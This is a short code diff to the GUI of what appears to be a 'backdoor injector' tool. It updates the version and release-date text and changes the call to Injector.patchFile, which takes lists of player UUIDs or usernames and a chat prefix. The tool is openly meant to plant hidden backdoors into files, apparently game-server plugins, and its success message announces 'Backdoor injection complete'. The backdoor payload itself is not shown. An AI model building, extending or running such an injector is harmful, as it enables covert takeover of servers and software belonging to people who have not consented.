@@ -33,8 +33,8 @@ public class InjectorGUI{
                 JOptionPane.showMessageDialog(
                         null,
                         "Created by: MajesticWaffle @ Thicc Industries,\n" +
-                                "Backdoor Version: 1.6\n" +
-                                "Release Date: September 19 2021\n" +
+                                "Backdoor Version: 2.0\n" +
+                                "Release Date: November 23 2021\n" +
                                 "License: GPL v3.0",
                         "Thicc Industries Injector",
                         JOptionPane.INFORMATION_MESSAGE
@@ -111,7 +111,7 @@ public class InjectorGUI{
         String[] splitUUID = UUIDList.split(",");
 
         Injector.SimpleConfig sc = new Injector.SimpleConfig(UUIDsAreUsernames, splitUUID, ChatPrefix);
-        boolean result2 = Injector.patchFile(InPath, OutPath, sc);
+        boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, false);
 
         if(result2){
             JOptionPane.showMessageDialog(null, "Backdoor injection complete.\nIf this project helped you, considering starring it on GitHub.", "Thicc Industries Injector", JOptionPane.INFORMATION_MESSAGE);
